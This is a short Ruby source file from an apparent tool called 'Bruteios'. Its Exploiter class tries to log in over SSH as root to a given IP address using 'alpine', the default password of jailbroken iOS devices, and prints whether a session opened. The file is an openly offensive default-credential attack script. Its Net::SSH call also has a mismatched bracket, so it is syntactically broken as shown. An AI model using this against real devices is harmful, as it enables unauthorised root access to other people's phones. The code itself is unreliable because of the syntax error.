module Bruteios
  class Exploiter
    def run(ip_addr)
      puts "Exploiting #{ip_addr}..."

      exploit_device(ip_addr)
    end

    private
    def exploit_device(ip_addr)
      puts "Attempting SSH"
      begin
	Net::SSH.start(ip_addr, "root", :password => "alpine", :auth_methods => ["password" :number_of_password_prompts => 0 ) do |ssh|
	  puts "SSH Session Established"
	end
      rescue Net::SSH::AuthenticationFailed => e
	puts "Unable to SSH into #{ip_addr}. Wrong Credentials."
      rescue Net::SSH::Disconnect => e
	puts "Unable to SSH into #{ip_addr}. SSH Server not running?"
      end

    end
  end
end